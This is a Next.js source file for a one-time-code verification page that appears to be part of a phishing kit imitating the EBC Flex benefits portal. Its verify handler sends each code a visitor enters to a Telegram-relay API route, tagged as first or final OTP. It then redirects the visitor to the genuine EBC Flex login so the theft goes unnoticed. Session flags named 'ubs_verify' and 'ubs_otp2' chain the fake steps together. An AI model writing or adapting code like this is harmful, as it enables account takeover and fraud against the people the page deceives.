"use client";

import { Suspense, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";

const EBC_FLEX_REDIRECT_URL =
  "https://portals.ebcflex.com/Participant/AuthenticateUser/Login.aspx?ReturnUrl=%2fParticipant";

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = (searchParams.get("method") ?? "email") as "email" | "phone";
  const isSecondOtp = searchParams.get("step") === "2";
  const numericCode = code.replace(/\D/g, "");
  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8;
  const confirmationTitle =
    method === "phone" ? "Phone Confirmation" : "Email Confirmation";
  const confirmationText =
    method === "phone"
      ? "A code has been sent to your phone number:"
      : "An email has been sent to the following address:";

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  const handleVerify = async () => {
    if (isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
          code,
        }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send verification notification:", error);
    }
    await new Promise((r) => setTimeout(r, 1000));
    if (isSecondOtp) {
      window.location.href = EBC_FLEX_REDIRECT_URL;
    } else {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_details", "1");
      router.push("/verify-details");
    }
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    }
    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <>
      <main className="min-h-screen bg-white px-4 py-6 md:hidden">
        <div className="max-w-md mx-auto flex flex-col gap-4">
          <div className="flex items-center gap-2 mb-1">
            <button
              type="button"
              onClick={() => router.back()}
              className="inline-flex items-center justify-center rounded-full p-2 text-[#254650]"
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
                strokeWidth="2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M9 5l-7 7 7 7"
                />
              </svg>
            </button>
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
          </div>

          <div className="rounded-lg border border-gray-200 bg-white p-4 shadow-sm">
            <h1 className="text-xl font-semibold text-gray-900">
              {confirmationTitle}
            </h1>
            <p className="mt-2 text-sm text-gray-700">{confirmationText}</p>

            <div className="mt-4 rounded-md bg-gray-50 px-3 py-2 text-center text-sm font-medium text-gray-600">
              {method === "phone" ? "phone number" : "email address"}
            </div>

            <div className="mt-4">
              <label htmlFor="verify-code" className="sr-only">
                Enter verification code
              </label>
              <input
                id="verify-code"
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) =>
                  setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                }
                maxLength={8}
                placeholder="Enter code"
                className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-base tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-[#254650]"
              />
            </div>

            <p className="mt-3 text-center text-sm text-gray-600">
              OTP will expire in 14m 57s
            </p>

            <p className="mt-3 text-sm text-gray-700">
              <span className="text-red-600 font-semibold">Note</span> - Do not
              share your verification code with anyone else.
            </p>

            <div className="mt-4 flex flex-col gap-2">
              <Button
                type="button"
                onClick={handleVerify}
                disabled={!isCodeValid || isLoading}
                className="w-full h-10 rounded-md bg-[#254650] text-white hover:bg-[#1e383f] disabled:opacity-70 disabled:pointer-events-none"
              >
                {isLoading ? "Loading..." : "Continue"}
              </Button>

              <Button
                type="button"
                variant="outline"
                onClick={handleResend}
                className="w-full h-10 rounded-md border-[#254650] text-[#254650] hover:bg-gray-50"
              >
                {isResending ? "Loading..." : "Didn't receive code"}
              </Button>
            </div>
          </div>
        </div>
      </main>

      <div className="hidden md:flex min-h-screen flex-col bg-white">
        <SiteHeader />
        <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15">
          <div className="mb-6">
            <h2 className="text-base font-medium text-gray-900 mb-4">
              Verify It's You
            </h2>
            <h1 className="text-2xl font-semibold text-gray-900 mb-3">
              Enter Access Code
            </h1>
            <p className="text-gray-700 text-sm mb-4">
              Enter the code that was sent to you.
            </p>

            <div className="flex items-center gap-2 mb-4">
              <span className="text-gray-700 text-sm">
                Didn't receive code?
              </span>
              <button
                type="button"
                onClick={handleResend}
                disabled={isResending}
                className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {isResending ? "Loading..." : "Resend code"}
              </button>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <input
                type="text"
                id="code"
                inputMode="numeric"
                value={code}
                onChange={(e) =>
                  setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                }
                placeholder=""
                className="w-full max-w-50 px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
                maxLength={8}
              />
            </div>

            <div className="flex gap-3 mt-3">
              <Button
                className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
                onClick={handleVerify}
                disabled={!isCodeValid || isLoading}
              >
                {isLoading ? "Loading..." : "Continue"}
              </Button>
              <Button
                variant="ghost"
                className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
                onClick={() => router.push("/verify-choice")}
              >
                Cancel
              </Button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
